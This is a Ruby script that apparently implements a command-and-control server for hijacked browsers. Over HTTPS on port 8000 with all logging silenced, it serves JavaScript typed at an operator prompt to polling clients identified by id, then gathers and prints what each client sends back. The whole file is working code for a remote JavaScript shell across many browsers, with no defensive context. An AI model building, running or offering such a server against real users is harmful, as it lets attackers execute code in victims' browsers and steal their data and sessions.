require 'webrick'
require 'webrick/https'
require 'openssl'
require 'uri'
require 'set'

cert = OpenSSL::X509::Certificate.new File.read 'cert.pem'
pkey = OpenSSL::PKey::RSA.new File.read 'pkey.pem'

server = WEBrick::HTTPServer.new(:Port => 8000,
                                 :SSLEnable => true,
                                 :SSLCertificate => cert,
                                 :SSLPrivateKey => pkey,
                                 :AccessLog => [],
                                 :Logger => WEBrick::Log.new('/dev/null'))

trap 'INT' do server.shutdown end

$jscode = ''
$ids_in  = Set.new []
$ids_out = Set.new []
$results = []
$ctr = 100

def wait
  sleep 0.1
  $ctr -= 1
end

def read_cmd
  return wait unless $ids_in == $ids_out or $ctr.zero?
  puts $results
  print ' js > '
  $jscode = readline
  $ids_in  = Set.new []
  $ids_out = Set.new []
  $results = []
  $ctr = 100
  sleep 0.1 while $ids_in.empty?
end

server.mount_proc '/js' do |req, res|
  id = req.query['id']
  res.status = 200
  res['Content-Type'] = 'application/javascript'
  res['Pragma'] = res['Cache-Control'] = 'no-cache'
  res.body = $ids_in.member?(id) ? '' : $jscode
  $ids_in.add id unless $jscode.empty?
end

server.mount_proc '/result' do |req, res|
  id = req.query['id']
  $results.push "#{id}\s->\s#{URI.unescape(req.query['r'])}"
  res.status = 200
  res['Content-Type'] = 'application/javascript'
  res['Pragma'] = res['Cache-Control'] = 'no-cache'
  res.body = ''
  16.times do
    break if $ids_in != $ids_out + [id]
    sleep 0.1
  end
  $ids_out.add id
end

Thread.new { server.start }

loop do
  read_cmd
end

